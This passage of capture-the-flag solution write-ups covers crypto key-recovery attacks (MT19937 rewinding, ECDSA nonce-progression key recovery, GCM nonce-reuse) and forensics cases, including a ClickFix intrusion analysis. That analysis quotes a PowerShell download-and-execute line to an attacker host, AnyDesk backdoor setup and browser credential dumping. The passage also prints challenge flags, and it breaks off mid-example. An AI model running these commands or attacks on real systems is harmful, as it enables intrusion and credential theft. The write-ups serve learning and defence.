4. **Invert the twist.** Cloning only runs the generator forward, so the twist from generation 1 to 2 must be undone. Each twist step is `new[i] = X ⊕ (y≫1) ⊕ (0x9908B0DF if y odd else 0)`, where `X = old[i+397]` (for `i < 227`) or the already-overwritten `new[i−227]` (for `i ≥ 227`). Since `y≫1` never has its top bit set but `0x9908B0DF` does, the top bit of `new[i] ⊕ X` says whether the constant was XORed in, and `y` comes back exactly. Steps 623→227 use words of the new state we already hold and give `old[228..623]`; those are the `old[i+397]` values steps 226→0 need. The low 31 bits of `old[0]` never reach the next generation, so they stay zero.

   ```python
   def unmix(v):
       return ((v ^ MAG) << 1) | 1 if v & UPPER else v << 1
   def previous_generation(new):
       y, old = [0]*624, [0]*624
       for i in range(623, 226, -1): y[i] = unmix(new[i] ^ new[i-227])
       for i in range(623, 227, -1): old[i] = (y[i] & UPPER) | (y[i-1] & LOWER)
       for i in range(226, -1, -1):  y[i] = unmix(new[i] ^ old[i+397])
       for i in range(227, 0, -1):   old[i] = (y[i] & UPPER) | (y[i-1] & LOWER)
       old[0] = y[0] & UPPER
       return old
   ```

5. **Decrypt the standing order.** Load the recovered generation at index 616, draw 8 words for the key, and unseal tx 155. The first eight draws are outputs 1240–1247; after them the generator twists and must re-emit the whole register, which it does (a free check of the whole rewind):

   ```
   tx 155 keys on outputs 1240..1247 = words 616..623 of the generation before the register
   after those 8 words the generator emits the whole register: True
   CSCTF{15_jam_the_enemy_net_at_dawn_7e2c04}
   ```

**Why it works**

MT19937 is not a cryptographic generator. Tempering is a bijection, so 624 outputs reveal the whole state, and the twist runs backwards as well as forwards (apart from 31 bits of the first word that the next generation never sees). Using its raw outputs as key words means a leaked window gives away both future and past keys. The SHA-256 keystream on top changes nothing once the key words can be predicted.

**Validation / reproduction**

The four in-window dispatches decrypting to readable text confirmed the scheme; the rewound generator re-emitting all 1248 register words after the eight key draws checks the whole inversion. The standing order decrypted to `CSCTF{...}` text and was accepted on the first submission.

Reproduction summary: decode the CBOR; implement the SHA-256 seal and decrypt tx 156–161; recognise MT19937 from the 624-word blocks, untemper the first 624 register words and confirm the clone; invert one twist to recover generation 1; load it at index 616, draw 8 key words, and unseal tx 155.

### The Signet

> Crypto · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{canal_signet_recovered_2f17026a4a9c032f4ba186ab}`

**Challenge**

A dispatch signet issued six orders during a documented entropy incident. An adversary may have read the sealed standing order and used it to divert defence logistics at a canal crossing. Inspect `sealed-orders.der` and `case-note.txt` and recover the complete `CSCTF{...}` order token.

- `case-note.txt`, 2441 bytes, SHA-256 `1a4bb290d7615010f4d47842166c84281f90c735f081ac40d7b94e27c5352839`.
- `sealed-orders.der`, 1042 bytes, SHA-256 `4f203322b6382224def50cb4075153ed659619c89a544eaf28a8183015eb805b`.

**Tools used**

`openssl asn1parse` to map the DER, Python (stdlib) for the key recovery, and `cryptography` for HKDF and AES-256-GCM.

**Approach / walkthrough**

1. **Map and authenticate the bundle.** `case-note.txt` describes `sealed-orders.der` as a `SignetBundle`: a version, the signer's secp256k1 SPKI, six signed orders (sequence 0–5, each with its exact message bytes and an ECDSA-SHA-256 `(r, s)` stored raw), and one seal (salt, 12-byte nonce, ciphertext, 16-byte tag). `openssl asn1parse -inform DER -in sealed-orders.der -i` shows the layout; some `s` values are 33-byte INTEGERs (a leading zero byte), so they sit above `n/2`, exactly as the note says the raw values would. The SPKI is the SEQUENCE at offset 7, so cut it out and hash it:

   ```sh
   openssl asn1parse -inform DER -in sealed-orders.der -strparse 7 -noout -out out/spki.der
   openssl dgst -sha256 -r out/spki.der
   # 1c6b38a86c3ff8b1d295e02b884c457da537767b5fdf063cf6d7d733b683a6b3
   ```

   This matches the SPKI fingerprint recorded in the note's pre-incident register, so the public key in the bundle is the real signer's.

2. **Model the nonces.** The note's key paragraph: "The entropy sampler stopped. Each consecutive signing operation consumed the next temporary scalar-register value … the same additive stride modulo the curve order." The "temporary scalar" is the ECDSA nonce, so with no skipped operations `k_i = k₀ + i·t (mod n)` for unknown start `k₀` and stride `t`. Each signature gives

   ```
   k_i = a_i + b_i·d,   with a_i = z_i/s_i,  b_i = r_i/s_i,   z_i = SHA-256(message_i) mod n
   ```

3. **Cancel the unknowns with a second difference.** Because the nonces step by a constant, any three consecutive orders satisfy `k_i − 2·k_{i+1} + k_{i+2} = 0`, which removes both `k₀` and `t`. Substituting `k_i = a_i + b_i·d` leaves one linear equation `A + B·d = 0`, with `A` and `B` the second differences of `a` and `b`, so `d = −A/B mod n`.

   ```python
   for i in range(len(records) - 2):
       A = a[i] - 2*a[i+1] + a[i+2]
       B = b[i] - 2*b[i+1] + b[i+2]
       guesses.append(-A * pow(B, -1, N) % N)
   assert len(set(guesses)) == 1          # all triples agree
   ```

   Running it:

   ```
   orders 0..2: d = 79c7842bf8177446127be0061bfb456d8c99811601cf3f86187b1a3b45b59d8f
   orders 1..3: d = 79c7842bf8177446127be0061bfb456d8c99811601cf3f86187b1a3b45b59d8f
   orders 2..4: d = 79c7842bf8177446127be0061bfb456d8c99811601cf3f86187b1a3b45b59d8f
   orders 3..5: d = 79c7842bf8177446127be0061bfb456d8c99811601cf3f86187b1a3b45b59d8f
   d*G is the signer key: True
   ```

   All four independent triples give the same `d`, and `d·G` equals the SPKI point.

4. **Open the seal.** The note gives the recipe: `IKM = I2OSP(d, 32)`, `key = HKDF-SHA-256(IKM, salt=seal.salt, info="CSCTF26/TheSignet/v1/standing-order", L=32)`, then AES-256-GCM with the stored 12-byte nonce and 16-byte tag, empty AAD:

   ```python
   ikm = d.to_bytes(32, "big")
   key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
              info=b"CSCTF26/TheSignet/v1/standing-order").derive(ikm)
   plaintext = AESGCM(key).decrypt(nonce, ciphertext + tag, b"")   # raises if the tag fails
   # CSCTF{canal_signet_recovered_2f17026a4a9c032f4ba186ab}
   ```

**Why it works**

An ECDSA signature binds the nonce and the private key in one linear relation, so the key stays hidden only while every nonce is fresh and independent. A stuck sampler that just adds a constant stride turns the six nonces into an arithmetic progression, leaving only three unknowns (`d`, `k₀`, `t`) against six equations; a second difference of three consecutive nonces cancels `k₀` and `t` and leaves a single linear equation for `d`. Keeping `s` raw matters: flipping one `s` to `n − s` would negate that nonce and break the progression, which is why the note stresses the raw values. Once `d` is known, the seal is just the documented HKDF/GCM recipe, and the GCM tag verifying proves the key was right.

**Validation / reproduction**

The six signatures give four independent triples (0–2, 1–3, 2–4, 3–5), all producing the same `d`; that `d` satisfies `d·G ==` the SPKI point, and the SPKI itself matches the note's pre-incident fingerprint. The AES-GCM tag verifies, which only happens with the correct key. The token was accepted on the first submission.

Reproduction summary: `openssl asn1parse` the DER, carve and hash the SPKI, parse the six `(message, r, s)` records and the seal fields; compute `a_i, b_i`; solve `d` from each second-difference triple and confirm they agree and that `d·G ==` the signer key; derive the HKDF key from `I2OSP(d,32)` and AES-256-GCM-decrypt the seal.

### Watchword

> Crypto · Medium · Chronos Security  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{watchword_2005b4d082c8f06019960d36c5131e783d4bc532}`

**Challenge**

A SABRELINK field authentication unit tags every dispatch with AES-128-GCM. A firmware fault made it reuse one message nonce across a run of dispatches. We intercepted three authenticated dispatches under that nonce plus one sealed master order, whose text is sealed with AES-128-CTR under the link's per-nonce authentication value `S = E_K(J0)`. Recover the master order.

- `watchword.zip`, 1207 bytes, SHA-256 `1e081c278b16e265391a8c6cf68cf2787ff2e54aae574b6c2d1cf0cada02647e`. Unpacks to `README.txt` and `intercepts.json`.

**Tools used**

Standard-library Python for the GF(2¹²⁸) arithmetic and polynomial GCD; `openssl enc -aes-128-ctr` for the unseal.

**Approach / walkthrough**

`intercepts.json` has one 96-bit nonce (`8f7ce996b767134353fe1145`), three AES-128-GCM dispatches with empty AAD (each: known plaintext, ciphertext, 16-byte tag), and a 57-byte `sealed_master_order_ctr_hex`. All three tags were produced under the single reused nonce. Each dispatch's ciphertext is at most 16 bytes.

1. **Write each tag as a polynomial in `H`.** With a 96-bit nonce, GCM sets `J0 = nonce || 0x00000001` and `tag = E_K(J0) ⊕ GHASH_H(A, C)`, where `H = E_K(0¹²⁸)` is the authentication key and AAD is empty. GHASH zero-pads `C` into 16-byte blocks, appends a length block `L = 0⁶⁴ || [8·len(C)]₆₄`, and folds everything through `GF(2)[x]/(x¹²⁸ + x⁷ + x² + x + 1)`. Each dispatch here has `n = 1` ciphertext block, so

   ```
   f_i(X) = C_i·X² ⊕ L_i·X ⊕ tag_i,   and   f_i(H) = E_K(J0) = S  for all three
   ```

   because the nonce — and therefore `J0` — is shared.

2. **Eliminate `S`.** Subtraction is XOR in characteristic 2, so `H` is a root of both `f₀ ⊕ f₁` and `f₀ ⊕ f₂`. Two polynomials sharing a root have a non-trivial GCD; with two independent differences the GCD came out degree 1, `X ⊕ H`, so `H` is pinned uniquely (not shortlisted):

   ```python
   g = pgcd(padd(fs[0], fs[1]), padd(fs[0], fs[2]))
   g = [gmul(c, ginv(g[-1])) for c in g]   # make monic -> [H, 1]
   assert len(g) == 2
   H = g[0]
   # H    = 730426f0d054fc7539d26145168be28a
   ```

3. **Recover the mask.** `S = tag₀ ⊕ C₀·H² ⊕ L₀·H = f₀(H)`:

   ```python
   mask = peval(fs[0], H)
   assert all(peval(f, H) == mask for f in fs)   # all three agree
   # mask = 66b18782c578d8b27ec249a6298dfeb2
   ```

   All three dispatches landing on the same mask at this `H` is an independent check — a wrong `H` would make them disagree.

4. **Unseal the master order.** The README seals the order with AES-128-CTR, IV all-zero (128-bit counter from zero), under key `S`:

   ```sh
   python3 -c "import json; open('out/sealed.bin','wb').write(bytes.fromhex(json.load(open('watchword/intercepts.json'))['sealed_master_order_ctr_hex']))"
   openssl enc -d -aes-128-ctr -K 66b18782c578d8b27ec249a6298dfeb2 \
     -iv 00000000000000000000000000000000 -in out/sealed.bin
   # CSCTF{watchword_2005b4d082c8f06019960d36c5131e783d4bc532}
   ```

**Why it works**

GCM's counter mode never repeats a keystream block, but its authenticity rests on one fixed field element `H = E_K(0)` and one mask `E_K(J0)` per nonce, and every tag is a known polynomial in `H` plus that mask. Reusing the nonce makes the mask common to all three dispatches, so the XOR of any two tag-polynomials has `H` as a root, and the GCD of two such differences pins `H` exactly. This is Joux's "forbidden attack" — the key `K` is never needed; `H = E_K(0)` stays one-way, but any single tag yields the mask once `H` is known. The device then reused that mask as an AES-CTR key for the order, so the order was only ever as secret as the tags transmitted beside it.

**Validation / reproduction**

The GCD being linear pins `H` exactly rather than narrowing to a shortlist, and all three independent dispatches agree on the mask at that `H` (a wrong `H` would make them disagree). The CTR output is clean printable text in `CSCTF{...}` format, accepted on the first submission.

Reproduction summary: unzip, verify the SHA-256; build each `f_i(X) = C_i X² ⊕ L_i X ⊕ tag_i` over GF(2¹²⁸); take the GCD of two tag-differences to recover `H`; evaluate `f₀(H)` for the mask and confirm all three agree; AES-128-CTR-decrypt the sealed bytes with the mask as key and an all-zero IV.


## Forensics

### Afterimage

> Forensics · Medium · Chronos Security  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{6f86acdd1d10e0d8a5a541bb}`

**Challenge**

A duty operator screenshotted their terminal, cropped the bottom off to hide
something sensitive, and posted the result to a shared channel. The handout is
that one picture, `relay-capture.png` (520×340, 8-bit RGB), a terminal capture
from "FIELD RELAY 7". It looks fine: its last visible line reads `recovery panel
retained in prior frame`, and then the image stops. The brief tells you plainly
that "the crop changed what you see, not what the file still carries" — recover
what was cropped away and read the station recovery key. The flag format is
`CSCTF{message}`.

**Approach / walkthrough**

*1. Confirm the file is intact as a PNG but carries extra bytes.* `file` reports
nothing unusual:

```sh
file relay-capture.png
# relay-capture.png: PNG image data, 520 x 340, 8-bit/color RGB, non-interlaced
```

`pngcheck` is the tool that notices the problem:

```sh
pngcheck relay-capture.png
# relay-capture.png  additional data after IEND chunk
# ERROR: relay-capture.png
```

A PNG is an 8-byte signature followed by chunks, each a 4-byte length, 4-byte
type, the data, and a 4-byte CRC. `IEND` is supposed to be the last chunk, and
every viewer stops reading there, so anything after it is invisible on screen but
still on disk.

*2. Map the chunks and recognize the pattern.* Search the raw bytes for the two
chunk names that matter:

```sh
grep -obaE 'IDAT|IEND' relay-capture.png
```

The output shows a run of `IDAT` chunks, an `IEND` at **byte 14255**, and then —
instead of end-of-file — twelve more `IDAT` chunks and a second `IEND` whose CRC
finishes exactly at the end of the 26,174-byte file (the second `IEND` type field
is at 26166; 26166 + 8 = 26174). The real image ends 8 bytes after the first
`IEND` (type + CRC), at **byte 14263**.

The trailing chunks keep the same 1036-byte spacing as the leading ones (1024
data bytes + 12 bytes of chunk overhead). The first `IDAT` is at offset 37, so
chunk boundaries fall at 37 + n×1036; the chunk at **14541** is 37 + 14×1036,
i.e. it is the 15th `IDAT` of a larger, uncropped image. The twelve trailing
chunks are chunks 15–26 of the original screenshot. The crop tool wrote the
smaller cropped PNG over the start of the old file and never truncated it. This
is the aCropalypse bug: CVE-2023-21036 in the Pixel Markup editor and
CVE-2023-28303 in the Windows Snipping Tool.

The 274 bytes between the end of the cropped image (byte 14263) and the length
field of the first complete trailing chunk (byte 14537) are the tail of the
original's 14th `IDAT` payload plus its 4-byte CRC — the header of that 14th
chunk was overwritten by the new PNG, so only its end survives.

*3. Reassemble the surviving compressed stream.* All `IDAT` data together is one
zlib/deflate stream holding every scanline top to bottom. We only have the end of
the original stream, so inflating from the start is impossible. But deflate is a
chain of independently-startable blocks, and decoding can begin at any block
boundary. A zlib sync flush leaves an easy-to-spot one: an empty stored block
ending in the bytes `00 00 ff ff`, with the next block starting on the following
byte. The leftover data contains exactly one such marker, at payload offset
**3123**.

The recovery script joins the leftover payloads, raw-inflates from just past that
marker with a zeroed 32 KiB preset dictionary (which stands in for the lost
earlier output in case a block refers back into it), cuts the result into
scanlines, and wraps them in a fresh PNG:

```python
import os, struct, zlib
png = open("relay-capture.png", "rb").read()
width = struct.unpack(">I", png[16:20])[0]

# Walk chunks like a viewer and stop after IEND.
pos = 8
while True:
    length, kind = struct.unpack(">I4s", png[pos:pos+8])
    pos += 12 + length
    if kind == b"IEND":
        break
tail = png[pos:]                       # 11911 bytes follow (pos == 14263)

# Fragment of the overwritten chunk's payload (minus its 4-byte CRC) + full chunks.
first = tail.index(b"IDAT") - 4
stream = bytearray(tail[:first-4])
pos = first
while tail[pos+4:pos+8] == b"IDAT":
    length = struct.unpack(">I", tail[pos:pos+4])[0]
    stream += tail[pos+8:pos+8+length]
    pos += 12 + length                 # leftover IDAT payload: 11751 bytes

start = stream.index(b"\x00\x00\xff\xff") + 4   # deflate block at offset 3123
inflater = zlib.decompressobj(-15, zdict=bytes(32768))
raw = inflater.decompress(stream[start:])

stride = 1 + width*3                   # 1 filter byte + 520*3 = 1561
rows = len(raw) // stride              # 312200 / 1561 = 200
raw = raw[len(raw)-rows*stride:]       # keep whole rows, counted back from the end

def chunk(kind, body):
    return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", zlib.crc32(kind+body))

ihdr = png[16:20] + struct.pack(">I", rows) + png[24:29]   # reuse IHDR, new height
os.makedirs("out", exist_ok=True)
open("out/recovered.png", "wb").write(
    b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))
```

Running it prints:

```
PNG ends at byte 14263, 11911 bytes follow
leftover IDAT payload: 11751 bytes
deflate block starts at payload offset 3123
inflated 312200 bytes = 200 rows of 520 px, final block reached: True
wrote out/recovered.png
```

**312,200 = 200 × 1561 exactly**, and the inflater reports it reached the final
block (`inflater.eof` is `True`), so the decode is clean and row-aligned.

*4. Read the key.* The stream ends with the image's bottom scanline, so the 200
recovered rows are the bottom of the original screenshot — exactly the strip the
crop removed. Open `out/recovered.png`, or let tesseract read it:

```sh
tesseract out/recovered.png - 2>/dev/null
# RELAY RECOVERY KEY — ROTATE AFTER USE
#
# CSCTF{6f86acdd1d10e0d8a5a541bb}
#
# relay BR-7 / emergency key custody
```

The flag is `CSCTF{6f86acdd1d10e0d8a5a541bb}`.

**Why it works**

Cropping only destroys data if the file is also truncated. The editor rewrote the
file in place with the smaller PNG and left the original length, so the end of the
original compressed pixel stream still sits after the new `IEND`, where no viewer
reads. Deflate decoding can start at any block boundary, and the `00 00 ff ff`
left by a flush marks one on a byte boundary; a zero-filled preset dictionary
covers any back-reference into the part we lost. Because an `IDAT` stream is
written top-to-bottom and ends with the bottom scanline, the bytes we recover line
up as the last 200 rows of the original — precisely the recovery-key panel that
was cropped off.

**Validation / reproduction**

Two self-checks confirm the recovery before OCR: the inflated length divided
evenly into 1561-byte scanlines, and the inflater reported end-of-stream, so the
rows are byte-aligned and complete rather than a lucky partial decode. The rebuilt
PNG then rendered as a coherent panel and tesseract read the `CSCTF{...}` line from
it. Accepted on first submission.

Reproduction, in short: `pngcheck` to spot data after `IEND`; `grep -obaE
'IDAT|IEND'` to see the second `IEND` and the 1036-byte chunk cadence that proves
the trailing `IDAT`s belong to a taller original; concatenate the leftover
payloads; raw-inflate from just after the single `00 00 ff ff` with a zeroed
32 KiB dictionary; slice into 1561-byte rows and wrap in a PNG with the new
height; read the key.

Gotchas: inflate from the byte **after** `00 00 ff ff`, not from the marker
itself. Drop the 4-byte CRC on the leading payload fragment. The preset dictionary
must be present (`zdict=bytes(32768)`) or back-references into the lost prefix
produce garbage. Count scanlines back from the end of the inflated output, since
only the tail of the stream survived and the first partial row may be dropped.

### Briefing for One

> Forensics · Medium · Chronos Security  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}`

**Challenge**

An intruder staged a routing package for a single workstation at the fictional
Rovenqara Civil Continuity Directorate. The shortcut was opened; isolation left
the regional shelter routing on paper. The handout is `briefing-for-one-…zip`
(161,346 bytes). Recover the package from the evidence and submit its briefing
token. The brief is explicit: analyze the files only — do not execute the shortcut
or DLL, or contact any captured addresses. Flag format: `CSCTF{32 lowercase hex
characters}`.

**Approach / walkthrough**

*1. Unpack and inventory.* Unzip the archive and verify members against the
`SHA256SUMS` that ships inside it:

```sh
unzip briefing-for-one-5f4125fbb77f625d.zip
shasum -a 256 -c SHA256SUMS
```

The ZIP holds three real artifacts — `briefing.lnk` (the shortcut that ran),
`machine-cryptography.hiv` (a saved registry key), and `egress.pcapng` (a packet
capture) — plus two case notes: `field-guide.md` and `provenance.json`. Read both
notes; the field guide warns about the exact pitfalls in the steps below.

*2. Decode the shortcut.* exiftool parses a `.lnk` without executing it. The
`CommandLineArguments` field holds the whole PowerShell recipe:

```sh
exiftool -s3 -CommandLineArguments briefing.lnk | tr ';' '\n'
```

The one-liner spells out every step:

- `permit.bin` is only a gate — it must exist, be 32 bytes, and hash to a fixed
  value. Its contents are never used again, so you can ignore it.
- The 7-Zip password `$p` is **HMAC-SHA256**, keyed with the Base64 key
  `eyy//ntonkO5y+zE61CW4ddRSUWiWBgzwe3ra1tENd8=` embedded in the shortcut, over the
  message `csctf26/briefing-for-one/v1` + one `0x00` byte + the machine's
  `MachineGuid` lowercased, rendered as lowercase hex. The GUID is read from
  `HKLM\SOFTWARE\Microsoft\Cryptography` — the key saved in the hive.
- The package is copied from
  `\\briefing.rovenqara.test@80\DavWWWRoot\ops\route-update.7z`. The `@80` UNC form
  is WebDAV over plain HTTP on port 80, so the download is in the capture, and it
  must hash to `d29a0679…`.
- 7-Zip extracts it with `-p` plus the password. The two extracted files must hash
  to `230b2e64…` (`route-update.dll`) and `cc106579…` (`route-table.json`), after
  which `rundll32` would call `ApplyRouteTable`. Every one of these pinned SHA-256
  values lets you check your work offline. We never run the DLL.

(If exiftool is unavailable, `strings -el briefing.lnk` shows the same command line
as a UTF-16 string.)

*3. Read the MachineGuid from the saved hive.* Per `provenance.json`, the hive is a
`reg.exe save` of only the Cryptography subkey, not the full SOFTWARE hive — so,
as the field guide warns, that subkey is the hive's **root**, and a tool looking
for a `Microsoft\Cryptography` path inside it finds nothing. The regf format is
documented, so a short standard-library parser walks the root `nk` cell to its
value list and reads the `vk` records directly:

```python
import struct, sys
hive = open(sys.argv[1], "rb").read()
assert hive[:4] == b"regf"
BINS = 0x1000
def cell(off): return hive[BINS+off+4:]        # skip 4-byte cell size
root = cell(struct.unpack_from("<I", hive, 0x24)[0])
n_val, val_list = struct.unpack_from("<II", root, 0x24)
for i in range(n_val):
    vk = cell(struct.unpack_from("<I", cell(val_list), 4*i)[0])
    name_len, size, data_off, vtype, vflags = struct.unpack_from("<HIIIH", vk, 2)
    name = vk[0x14:0x14+name_len].decode("latin-1" if vflags & 1 else "utf-16-le")
    data = struct.pack("<I", data_off)[:size & 0x7FFFFFFF] if size & 0x80000000 else cell(data_off)[:size]
    print(name, "=", data.decode("utf-16-le").rstrip("\0"))
```

```
root key: Cryptography  (last written 2026-08-25 22:10:56 UTC)
...
  MachineGuid [REG_SZ] = '080c7be1-f41c-446c-b961-93bd7bc4ea31'
```

The root key is `Cryptography` and `MachineGuid` sits directly on it:
**`080c7be1-f41c-446c-b961-93bd7bc4ea31`**, already lowercase and matching the
shortcut's format check. (python-registry shows the same if you prefer a library.)

*4. Carve the package from the capture.* Windows fetches a `\\host@80\DavWWWRoot\…`
path with its WebDAV client, which is ordinary HTTP. List the HTTP traffic:

```sh
tshark -r egress.pcapng -Y http -T fields -E header=y \
  -e frame.number -e http.request.method -e http.request.uri \
  -e http.response.code -e http.content_type -e http.content_length
```

Most of it is WebDAV housekeeping (an OPTIONS, then PROPFIND requests answered with
207/XML). Exactly one `GET /ops/route-update.7z` is answered (frame 62) with **5359
bytes** of `application/octet-stream`. Export every HTTP body and sort them out:

```sh
tshark -r egress.pcapng -q --export-objects http,out/http
file out/http/*
shasum -a 256 out/http/*
```

Watch the trap here: tshark names each exported object after its URL, so the three
PROPFIND replies for `/ops/route-update.7z` are also saved with a `.7z` name, but
`file` shows they are 914-byte XML documents. Only one export is a real "7-zip
archive data" file, and its SHA-256 is exactly the `$aHash`
(`d29a06795dd5e2346ea5c8a107c2c5b4b916dcabd7cf0011fe600fa3b13ae4c2`) pinned in the
shortcut. Pick that one by hash, not by filename:

```sh
cp "out/http/route-update(3).7z" out/route-update.7z   # the one matching $aHash
```

*5. Rebuild the password.* Recompute the HMAC in Python. The field guide includes a
worked example that uses an uppercase installation value lowercased inside the
message, so reproducing it first confirms the byte layout (single `00` separator,
no trailing newline):

```python
import base64, hashlib, hmac
LABEL = b"csctf26/briefing-for-one/v1"
def password(key, guid):
    return hmac.new(key, LABEL + b"\x00" + guid.lower().encode(), hashlib.sha256).hexdigest()

# field-guide test vector (key 00..1f, uppercase GUID) — confirms byte handling
assert password(bytes(range(32)), "00112233-4455-6677-8899-AABBCCDDEEFF") == \
       "7dad69912b67470da7713c666337135b568030605bc2e88f99524596366d10d0"

key = base64.b64decode("eyy//ntonkO5y+zE61CW4ddRSUWiWBgzwe3ra1tENd8=")
print(password(key, "080c7be1-f41c-446c-b961-93bd7bc4ea31"))
```

The key decodes to 32 bytes
(`7b2cbffe7b689e43b9cbecc4eb5096e1d7514945a2581833c1edeb6b5b4435df`) and the
password is the 64-character digest
**`ee731407a271c8aa4b92f93d362591626421d32465aeba3f912ac09c576dc6c0`** — exactly
what the shortcut passes as `'-p'+$p`.

*6. Decrypt and read the token.* The archive is 7zAES with encrypted headers
(`provenance.json` notes this, which is why you cannot even list its members
without the password):

```sh
7z x -pee731407a271c8aa4b92f93d362591626421d32465aeba3f912ac09c576dc6c0 \
   -oout/package -y out/route-update.7z
shasum -a 256 out/package/*
```

Both extracted files match the shortcut's pinned hashes (`cc106579…` for
`route-table.json`, `230b2e64…` for `route-update.dll`), confirming this is the
package the workstation unpacked. The token is in `route-table.json`:

```sh
python3 -c 'import json; print(json.load(open("out/package/route-table.json"))["briefing_token"])'
# CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}
```

The DLL only carries the JSON template around the token (`strings` on it shows
`{"schema":1,"briefing_token":"CSCTF{` with nothing after), so there is nothing to
dig for there. The flag is `CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}`.

**Why it works**

The package is bound to one workstation by deriving its password from that
machine's `MachineGuid` with a secret stored in the shortcut, and both the
archive's contents and its file list are AES-encrypted. That binding only protects
the package if the inputs stay apart — and the evidence hands over all three
separately: the key and the exact recipe in `briefing.lnk`, the GUID in the saved
Cryptography key, and the ciphertext in an unencrypted WebDAV GET (because
`\\host@80\DavWWWRoot\…` is plain HTTP). Recomputing the HMAC offline yields the
same password the workstation used.

**Validation / reproduction**

Every step was checked against a value the attacker pinned: the carved archive's
SHA-256 matched `$aHash`; the HMAC code reproduced the field guide's test vector
before being trusted on the real inputs; and both decrypted files matched the
shortcut's expected hashes. The recovered token fits the 32-hex `CSCTF{...}`
format. Accepted on first submission.

Reproduction, in short: `exiftool -CommandLineArguments` to read the recipe; parse
the regf root key for `MachineGuid`; `tshark --export-objects http` and pick the
export whose hash equals `$aHash` (not by filename); recompute HMAC-SHA256(key,
label + 0x00 + lowercased GUID) as hex; `7z x -p<digest>`; read `briefing_token`.

Gotchas: the hive root *is* `Cryptography`, so don't path-walk to
`Microsoft\Cryptography` — it isn't there. The message separator is a single `0x00`
byte with no trailing newline, and the GUID must be lowercased before hashing. Of
the several `route-update*.7z` exports, only the real archive matches `$aHash`; the
others are PROPFIND XML. The field guide's example key (`00..1f`) is a test vector,
not workstation data.

### CAPTCHA the Water Plant

> Forensics · Easy · Marius Merai  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}
```

**Challenge**

Nordvia Water Utility lost its distribution-control panel and pressure collapsed across the northern
districts. An administrator account was used from one of three laptops. The brief gives three KAPE triage
collections taken after the incident and asks us to follow the evidence through four stages: what the user
ran, what it launched, the persistence it left behind, and finally the browser evidence it exposed.

The three attachments (`ENG-LAPTOP-23.zip`, `FIELD-WKS-21.zip`, `OPS-NB-06.zip`) are KAPE *parsed* output
(`Kape-parsed-<HOST>/`), not raw artifacts. Each holds Eric Zimmerman tool CSVs (RECmd batch, EvtxECmd,
PECmd, MFTECmd, Amcache, AppCompatCache, SrumECmd, LECmd/JLECmd, SBECmd) plus a Hindsight `.xlsx` for the
Chromium-based browser (Microsoft Edge, from the profile paths). Only OPS-NB-06 also carries a
`Persistence/` folder. Because everything was already parsed, the job is correlating CSVs, not parsing raw
artifacts, and nothing had to be executed. The last three of the brief's four stages each yield one flag
fragment.

**Approach / walkthrough**

Triage routed the challenge to the forensics playbook and its engines (`windows.py`, `timeline.py`,
`sqlite_artifacts.py`). With pre-parsed CSVs the fastest route is plain text search over the extracted
collections, steered by the brief's four stages. All work was offline and static, on the supplied files
only; the fictional C2 host in the evidence was never contacted.

```sh
mkdir w && cd w && unzip -oq ../files/OPS-NB-06.zip -d ops   # repeat for the other two hosts
grep -rl zindetify ops    # C2 host appears only in OPS-NB-06
```

The C2 hostname `zindetify` appears in no file of the other two collections, so only OPS-NB-06 is analyzed
further.

*1. What the user ran (RunMRU).* The Win+R history lives in
`Registry/*_RECmd_Batch_RECmd_Batch_MC_Output.csv` (key `RunMRU(Start>Run)`). ENG-LAPTOP-23 has an empty
RunMRU; FIELD-WKS-21 (user `localuser`) holds only `calc`, `notepad`, `powershell`. OPS-NB-06 (user
`ops06.nwu`) has a single entry (`MRUList = a`), key last-written `2026-10-21 04:30:47`, a classic
ClickFix one-liner:

```
powershell.exe -nop  -ep Bypass "[System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData('http://zindetify.dev.boot:8080/validator')) | iex"
```

(The double space after `-nop` is in the stored value.) This identifies OPS-NB-06 as the compromised
laptop.

*2. What it launched (PowerShell 4104).* In `EventLogs/*_EvtxECmd_Output.csv`, Microsoft-Windows-
PowerShell/Operational event **4104** (script-block logging) captures the full fetched `/validator` payload
about three seconds after the RunMRU write. The script hides its logic behind 50 junk `Get-DataNN` padding
functions, then registers a daily scheduled task, downloads AnyDesk from `/tool` into
`C:\temp\Maitenance\`, installs it silently (`--start-with-win --silent`), and sets a fixed
unattended-access password:

```powershell
Start-Process --FilePath $InstalledExe -ArgumentList "--set-password `"f@k3_c@ptch@`""
```

(`--FilePath` with two dashes is as written in the evidence.) PECmd confirms
`\TEMP\MAITENANCE\SETUP\ANYDESK.EXE` executed. That AnyDesk password is **fragment 1: `f@k3_c@ptch@`**.

*3. Persistence (scheduled task).* TaskScheduler event **106** (task registered) records the task
`\Maitenance Check , ` (misspelling as in the evidence), user context `OPS-NB-06\ops06.nwu`. The payload
sets the task `-Description` from `Get-Data51`, which returns the content of `/config`.
`Persistence/Scheduled Tasks.csv` shows that value in the task's **Comment** column:

```
..."DownloadData('http://zindetify.dev.boot:8080/validator')) | iex","N/A","_r3@l_m@lw@r3","Enabled",...
```

**Fragment 2: `_r3@l_m@lw@r3`** — the leading underscore is part of the stored value. Event 200 shows
the task ran again at 2026-10-21 15:10:00, and 4104 logged the same payload a second time three seconds
later, confirming the task is the persistence mechanism rather than a one-off.

*4. Browser evidence (Hindsight).* On 2026-10-28, with AnyDesk running, 4104 and PECmd show the attacker's
hands-on session: downloading a NirSoft suite, then running `BROWSINGHISTORYVIEW.EXE` and
`WEBBROWSERPASSVIEW.EXE` to dump saved browser credentials. Shortly after that password dump,
`WebBrowsers/Hindsight_output.xlsx` (read by unzipping the xlsx and parsing `xl/sharedStrings.xml` and
`xl/worksheets/sheet1.xml`) records an Edge login as `admin` on the water utility's admin panel, followed
by a redirect to an admin dashboard:

```
